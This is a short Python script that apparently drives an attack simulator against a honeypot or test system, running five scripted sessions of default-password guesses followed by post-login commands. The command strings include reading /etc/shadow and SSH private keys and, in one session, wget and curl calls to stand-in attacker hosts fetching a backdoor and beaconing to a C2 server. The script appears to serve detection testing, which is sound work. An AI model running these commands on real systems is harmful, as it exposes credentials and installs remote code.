#!/usr/bin/env python3
"""Run remaining 5 varied sessions with delays."""
import subprocess, sys, os, time

PY = r"C:\Users\lnorton\AppData\Local\Python\bin\python3.14.exe"
SCRIPT = os.path.join(os.path.dirname(__file__), "attack_simulator.py")

SESSIONS = [
    {"name": "V7-jenkins-recon", "FAILED": "jenkins:jenkins|admin:jenkins123", "SUCCESS": "admin:test123", "CMDS": "ls -la /var/jenkins_home/ 2>/dev/null|ps aux | grep jenkins|netstat -tlnp | grep 8080|exit"},
    {"name": "V8-docker-recon", "FAILED": "docker:docker123|container:container", "SUCCESS": "admin:test123", "CMDS": "docker ps 2>/dev/null|ls -la /var/run/docker.sock 2>/dev/null|cat /proc/1/cgroup|ls -la /.dockerenv|exit"},
    {"name": "V9-pentest-tools", "FAILED": "kali:kali|parrot:parrot|blackarch:blackarch", "SUCCESS": "admin:test123", "CMDS": "which nmap|which hydra|which john|ls /usr/share/wordlists/ 2>/dev/null|cat /etc/passwd | grep -v nologin|exit"},
    {"name": "V10-multi-vector", "FAILED": "admin:password123|user:user123|root:root123|mysql:mysql123|postgres:postgres123", "SUCCESS": "admin:test123", "CMDS": "whoami|id|uname -a|cat /etc/shadow|ls -la /home|w|wget http://evil.com/backdoor|curl http://c2server.com/beacon|chmod 777 /tmp|crontab -l|exit"},
    {"name": "V11-ssh-tunnel", "FAILED": "tunnel:tunnel123|vpn:vpn123", "SUCCESS": "admin:test123", "CMDS": "cat /etc/ssh/sshd_config|ls -la ~/.ssh/|cat ~/.ssh/id_rsa 2>/dev/null|netstat -tlnp|exit"},
]

for i, s in enumerate(SESSIONS, 1):
    print(f"\n  SESION {i}/5: {s['name']}")
    env = os.environ.copy()
    env["FAILED_ATTEMPTS"] = s["FAILED"]
    env["SUCCESS_ATTEMPT"] = s["SUCCESS"]
    env["COMMANDS"] = s["CMDS"]
    subprocess.run([PY, SCRIPT], env=env, cwd=os.path.dirname(os.path.dirname(__file__)))
    print(f"  Waiting 5s before next session...")
    time.sleep(5)

print("\n=== COMPLETADO ===")
